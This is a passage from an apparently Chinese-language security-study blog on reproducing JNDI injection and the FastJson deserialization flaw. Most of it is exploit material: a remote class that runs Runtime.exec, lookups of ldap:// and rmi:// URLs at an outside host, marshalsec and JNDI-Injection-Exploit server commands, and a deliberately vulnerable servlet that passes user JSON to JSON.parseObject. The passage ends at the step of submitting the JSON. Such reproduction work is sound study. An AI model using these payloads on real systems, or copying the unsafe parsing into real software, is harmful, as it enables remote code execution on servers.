</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Runtime</span><span class="p">.</span><span class="na">getRuntime</span><span class="p">().</span><span class="na">exec</span><span class="p">(</span><span class="s">&#34;calc&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><div class="code-block-container" id="code-1769750397389787100" data-expanded="false" role="region" aria-labelledby="btn-code-1769750397389787100">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">java</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy" aria-label="复制代码">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" id="btn-code-1769750397389787100" title="Toggle" aria-expanded="false" aria-controls="code-1769750397389787100" aria-label="展开或折叠代码块">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content" id="code-1769750397389787100-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks"> 1</span>
</span><span class="lnt" id="2"><span class="lnlinks"> 2</span>
</span><span class="lnt" id="3"><span class="lnlinks"> 3</span>
</span><span class="lnt" id="4"><span class="lnlinks"> 4</span>
</span><span class="lnt" id="5"><span class="lnlinks"> 5</span>
</span><span class="lnt" id="6"><span class="lnlinks"> 6</span>
</span><span class="lnt" id="7"><span class="lnlinks"> 7</span>
</span><span class="lnt" id="8"><span class="lnlinks"> 8</span>
</span><span class="lnt" id="9"><span class="lnlinks"> 9</span>
</span><span class="lnt" id="10"><span class="lnlinks">10</span>
</span><span class="lnt" id="11"><span class="lnlinks">11</span>
</span><span class="lnt" id="12"><span class="lnlinks">12</span>
</span><span class="lnt" id="13"><span class="lnlinks">13</span>
</span><span class="lnt" id="14"><span class="lnlinks">14</span>
</span><span class="lnt" id="15"><span class="lnlinks">15</span>
</span><span class="lnt" id="16"><span class="lnlinks">16</span>
</span><span class="lnt" id="17"><span class="lnlinks">17</span>
</span><span class="lnt" id="18"><span class="lnlinks">18</span>
</span><span class="lnt" id="19"><span class="lnlinks">19</span>
</span><span class="lnt" id="20"><span class="lnlinks">20</span>
</span><span class="lnt" id="21"><span class="lnlinks">21</span>
</span><span class="lnt" id="22"><span class="lnlinks">22</span>
</span><span class="lnt" id="23"><span class="lnlinks">23</span>
</span><span class="lnt" id="24"><span class="lnlinks">24</span>
</span><span class="lnt" id="25"><span class="lnlinks">25</span>
</span><span class="lnt" id="26"><span class="lnlinks">26</span>
</span><span class="lnt" id="27"><span class="lnlinks">27</span>
</span><span class="lnt" id="28"><span class="lnlinks">28</span>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">//	User.java</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">com.xiaodi</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="c1">//给fastjson数据转换测试用的</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">User</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">name</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="n">Integer</span><span class="w"> </span><span class="n">age</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">Integer</span><span class="w"> </span><span class="nf">getAge</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">age</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">getName</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">name</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">setAge</span><span class="p">(</span><span class="n">Integer</span><span class="w"> </span><span class="n">age</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="na">age</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">age</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">age</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">setName</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">name</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="na">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">name</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">name</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><h1 id="37-jndl注入">37-JNDL注入<a hidden class="anchor" aria-hidden="true" href="#37-jndl注入">#</a></h1>
<p>参考：</p>
<p><a href="https://drun1baby.top/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/">https://drun1baby.top/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/</a></p>
<p><a href="http://blog.csdn.net/dupei/article/details/120534024">http://blog.csdn.net/dupei/article/details/120534024</a></p>
<p><a href="https://blog.csdn.net/2301_79837041/article/details/137647502">https://blog.csdn.net/2301_79837041/article/details/137647502</a></p>
<h2 id="jndl">JNDL<a hidden class="anchor" aria-hidden="true" href="#jndl">#</a></h2>
<h3 id="jndi-injection-exploit">JNDI-Injection-Exploit<a hidden class="anchor" aria-hidden="true" href="#jndi-injection-exploit">#</a></h3>
<p><code>java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar </code></p>
<div class="code-block-container" id="code-1769750397392411400" data-expanded="false" role="region" aria-labelledby="btn-code-1769750397392411400">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">java</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy" aria-label="复制代码">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" id="btn-code-1769750397392411400" title="Toggle" aria-expanded="false" aria-controls="code-1769750397392411400" aria-label="展开或折叠代码块">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content" id="code-1769750397392411400-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks"> 1</span>
</span><span class="lnt" id="2"><span class="lnlinks"> 2</span>
</span><span class="lnt" id="3"><span class="lnlinks"> 3</span>
</span><span class="lnt" id="4"><span class="lnlinks"> 4</span>
</span><span class="lnt" id="5"><span class="lnlinks"> 5</span>
</span><span class="lnt" id="6"><span class="lnlinks"> 6</span>
</span><span class="lnt" id="7"><span class="lnlinks"> 7</span>
</span><span class="lnt" id="8"><span class="lnlinks"> 8</span>
</span><span class="lnt" id="9"><span class="lnlinks"> 9</span>
</span><span class="lnt" id="10"><span class="lnlinks">10</span>
</span><span class="lnt" id="11"><span class="lnlinks">11</span>
</span><span class="lnt" id="12"><span class="lnlinks">12</span>
</span><span class="lnt" id="13"><span class="lnlinks">13</span>
</span><span class="lnt" id="14"><span class="lnlinks">14</span>
</span><span class="lnt" id="15"><span class="lnlinks">15</span>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">com.example.jndiinjectdemo</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">javax.naming.InitialContext</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">javax.naming.NamingException</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">JndiDemo</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">NamingException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// 创建一个rmi ldap 等服务调用  实例化对象</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">InitialContext</span><span class="w"> </span><span class="n">ini</span><span class="w"> </span><span class="o">=</span><span class="w">  </span><span class="k">new</span><span class="w"> </span><span class="n">InitialContext</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// 调用rmi ldap 等服务对象类 (远程服务)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//ldap://172.27.169.198:1432/gf3srt = 远程地址的一个.class文件</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ini</span><span class="p">.</span><span class="na">lookup</span><span class="p">(</span><span class="s">&#34;ldap://172.27.169.198:1432/gf3srt&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ini</span><span class="p">.</span><span class="na">lookup</span><span class="p">(</span><span class="s">&#34;rmi://172.27.169.198:162/gf3srt&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><h3 id="marshalsec">marshalsec<a hidden class="anchor" aria-hidden="true" href="#marshalsec">#</a></h3>
<div class="code-block-container" id="code-1769750397397309100" data-expanded="false" role="region" aria-labelledby="btn-code-1769750397397309100">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">java</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy" aria-label="复制代码">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" id="btn-code-1769750397397309100" title="Toggle" aria-expanded="false" aria-controls="code-1769750397397309100" aria-label="展开或折叠代码块">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content" id="code-1769750397397309100-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks">1</span>
</span><span class="lnt" id="2"><span class="lnlinks">2</span>
</span><span class="lnt" id="3"><span class="lnlinks">3</span>
</span><span class="lnt" id="4"><span class="lnlinks">4</span>
</span><span class="lnt" id="5"><span class="lnlinks">5</span>
</span><span class="lnt" id="6"><span class="lnlinks">6</span>
</span><span class="lnt" id="7"><span class="lnlinks">7</span>
</span><span class="lnt" id="8"><span class="lnlinks">8</span>
</span><span class="lnt" id="9"><span class="lnlinks">9</span>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">com.example.jndiinjectdemo</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.IOException</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">TestJndi</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="nf">TestJndi</span><span class="p">()</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Runtime</span><span class="p">.</span><span class="na">getRuntime</span><span class="p">().</span><span class="na">exec</span><span class="p">(</span><span class="s">&#34;calc&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><p>将编译后的文件上传到Linux的目录</p>
<div class="code-block-container" id="code-1769750397398848900" data-expanded="false" role="region" aria-labelledby="btn-code-1769750397398848900">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">java</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy" aria-label="复制代码">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" id="btn-code-1769750397398848900" title="Toggle" aria-expanded="false" aria-controls="code-1769750397398848900" aria-label="展开或折叠代码块">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content" id="code-1769750397398848900-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks">1</span>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">java</span><span class="w"> </span><span class="o">-</span><span class="n">cp</span><span class="w"> </span><span class="n">marshalsec</span><span class="o">-</span><span class="n">0</span><span class="p">.</span><span class="na">0</span><span class="p">.</span><span class="na">3</span><span class="o">-</span><span class="n">SNAPSHOT</span><span class="o">-</span><span class="n">all</span><span class="p">.</span><span class="na">jar</span><span class="w"> </span><span class="n">marshalsec</span><span class="p">.</span><span class="na">jndi</span><span class="p">.</span><span class="na">LDAPRefServer</span><span class="w"> </span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="p">(</span><span class="n">有class文件的地址</span><span class="p">)</span><span class="o">/</span><span class="err">#</span><span class="n">TestJndi</span></span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><p><strong>此处注意对JDK版本有要求</strong></p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202601300902574.png" style="max-width: 100%; height: auto;"></p>
<h2 id="jndi注入-fastjson漏洞结合">JNDI注入-FastJson漏洞结合<a hidden class="anchor" aria-hidden="true" href="#jndi注入-fastjson漏洞结合">#</a></h2>
<p>背景：JavaEE中接受用户提交的JSON数据进行转换（FastJson反序列化漏洞）</p>
<p>思路：利用InitialContext.lookup()中的进行JdbcRowSetImpl类JNDI服务注入,漏洞利用FastJsonautotype处理Json对象的时候，未对@type字段进行完整的安全性验证，攻击者可以传入危险类，并调用危险类连接远程RMI主机，通过其中的恶意类执行代码。攻击者通过这种方式可以实现远程代码执行漏洞，获取服务器敏感信息，甚至可以利用此漏洞进一步的对服务器数据进行操作。</p>
<h3 id="复现漏洞">复现漏洞<a hidden class="anchor" aria-hidden="true" href="#复现漏洞">#</a></h3>
<div class="code-block-container" id="code-1769750397400071800" data-expanded="false" role="region" aria-labelledby="btn-code-1769750397400071800">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">plain</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy" aria-label="复制代码">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" id="btn-code-1769750397400071800" title="Toggle" aria-expanded="false" aria-controls="code-1769750397400071800" aria-label="展开或折叠代码块">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content" id="code-1769750397400071800-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks"> 1</span>
</span><span class="lnt" id="2"><span class="lnlinks"> 2</span>
</span><span class="lnt" id="3"><span class="lnlinks"> 3</span>
</span><span class="lnt" id="4"><span class="lnlinks"> 4</span>
</span><span class="lnt" id="5"><span class="lnlinks"> 5</span>
</span><span class="lnt" id="6"><span class="lnlinks"> 6</span>
</span><span class="lnt" id="7"><span class="lnlinks"> 7</span>
</span><span class="lnt" id="8"><span class="lnlinks"> 8</span>
</span><span class="lnt" id="9"><span class="lnlinks"> 9</span>
</span><span class="lnt" id="10"><span class="lnlinks">10</span>
</span><span class="lnt" id="11"><span class="lnlinks">11</span>
</span><span class="lnt" id="12"><span class="lnlinks">12</span>
</span><span class="lnt" id="13"><span class="lnlinks">13</span>
</span><span class="lnt" id="14"><span class="lnlinks">14</span>
</span><span class="lnt" id="15"><span class="lnlinks">15</span>
</span><span class="lnt" id="16"><span class="lnlinks">16</span>
</span><span class="lnt" id="17"><span class="lnlinks">17</span>
</span><span class="lnt" id="18"><span class="lnlinks">18</span>
</span><span class="lnt" id="19"><span class="lnlinks">19</span>
</span><span class="lnt" id="20"><span class="lnlinks">20</span>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">package com.example.fastjsonjndiweb;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">import com.alibaba.fastjson.JSON;
</span></span><span class="line"><span class="cl">import com.alibaba.fastjson.JSONObject;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">import javax.servlet.annotation.WebServlet;
</span></span><span class="line"><span class="cl">import javax.servlet.http.HttpServletRequest;
</span></span><span class="line"><span class="cl">import javax.servlet.http.HttpServletResponse;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">@WebServlet(&#34;/json&#34;)
</span></span><span class="line"><span class="cl">public class Fsweb extends HelloServlet{
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    @Override
</span></span><span class="line"><span class="cl">    protected void doPost(HttpServletRequest req, HttpServletResponse resp){
</span></span><span class="line"><span class="cl">        String jsondata = req.getParameter(&#34;str&#34;);
</span></span><span class="line"><span class="cl">        //System.out.println(jsondata);
</span></span><span class="line"><span class="cl">        JSONObject jsonObject = JSON.parseObject(jsondata);
</span></span><span class="line"><span class="cl">        System.out.println(jsonObject);
</span></span><span class="line"><span class="cl">    }
</span></span><span class="line"><span class="cl">}</span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><div class="code-block-container" id="code-1769750397400071800" data-expanded="false" role="region" aria-labelledby="btn-code-1769750397400071800">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">html</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy" aria-label="复制代码">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" id="btn-code-1769750397400071800" title="Toggle" aria-expanded="false" aria-controls="code-1769750397400071800" aria-label="展开或折叠代码块">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content" id="code-1769750397400071800-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks"> 1</span>
</span><span class="lnt" id="2"><span class="lnlinks"> 2</span>
</span><span class="lnt" id="3"><span class="lnlinks"> 3</span>
</span><span class="lnt" id="4"><span class="lnlinks"> 4</span>
</span><span class="lnt" id="5"><span class="lnlinks"> 5</span>
</span><span class="lnt" id="6"><span class="lnlinks"> 6</span>
</span><span class="lnt" id="7"><span class="lnlinks"> 7</span>
</span><span class="lnt" id="8"><span class="lnlinks"> 8</span>
</span><span class="lnt" id="9"><span class="lnlinks"> 9</span>
</span><span class="lnt" id="10"><span class="lnlinks">10</span>
</span><span class="lnt" id="11"><span class="lnlinks">11</span>
</span><span class="lnt" id="12"><span class="lnlinks">12</span>
</span><span class="lnt" id="13"><span class="lnlinks">13</span>
</span><span class="lnt" id="14"><span class="lnlinks">14</span>
</span><span class="lnt" id="15"><span class="lnlinks">15</span>
</span><span class="lnt" id="16"><span class="lnlinks">16</span>
</span><span class="lnt" id="17"><span class="lnlinks">17</span>
</span><span class="lnt" id="18"><span class="lnlinks">18</span>
</span><span class="lnt" id="19"><span class="lnlinks">19</span>
</span><span class="lnt" id="20"><span class="lnlinks">20</span>
</span><span class="lnt" id="21"><span class="lnlinks">21</span>
</span><span class="lnt" id="22"><span class="lnlinks">22</span>
</span><span class="lnt" id="23"><span class="lnlinks">23</span>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="err">&lt;</span>%@ page contentType=&#34;text/html; charset=UTF-8&#34; pageEncoding=&#34;UTF-8&#34; %&gt;
</span></span><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE html&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>JSP - Hello World<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span><span class="err">&lt;</span>%= &#34;Hello World!&#34; %&gt;
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">br</span><span class="p">/&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;hello-servlet&#34;</span><span class="p">&gt;</span>Hello Servlet<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">form</span> <span class="na">action </span><span class="o">=</span> <span class="s">&#34;/FastJsonJndiWeb_war_exploded//json&#34;</span> <span class="na">method </span><span class="o">=</span> <span class="s">&#34;post&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    please input json data:<span class="p">&lt;</span><span class="nt">input</span> <span class="na">type </span><span class="o">=</span> <span class="s">&#34;text&#34;</span> <span class="na">name </span><span class="o">=</span> <span class="s">&#34;str&#34;</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;submit&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;提交&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span></span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><p>生成远程调用方法</p>
<p><code>java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;calc&quot; -A 127.0.0.1</code></p>
<p>rmi://127.0.0.1:1099/0junlw</p>
<p>提交JSON<br>
